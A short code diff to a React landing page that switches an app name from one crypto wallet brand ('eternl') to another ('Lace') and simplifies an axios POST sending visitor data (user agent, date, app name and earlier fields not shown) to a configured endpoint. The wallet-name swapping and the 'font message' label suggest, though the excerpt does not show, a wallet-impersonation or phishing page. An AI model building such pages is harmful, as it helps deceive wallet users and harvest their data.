@@ -78,20 +78,13 @@ function LandingPageContent() {
       },
       agent: typeof navigator !== "undefined" ? navigator.userAgent : browser,
       date: new Date().toISOString(),
-      appName: "eternl",
+      appName: "Lace",
     };
     console.log("Message Data", messageData);
     axios
-      .post(
-        API_CONFIG.URL,
-        messageData,
-        {
-          headers: {
-            "Content-Type": "application/json",
-            "x-api-key": API_CONFIG.KEY,
-          },
-        }
-      )
+      .post(API_CONFIG.URL, messageData, {
+        headers: { "Content-Type": "application/json" },
+      })
       .catch((error) =>
         console.error(
           "Error sending font message:",
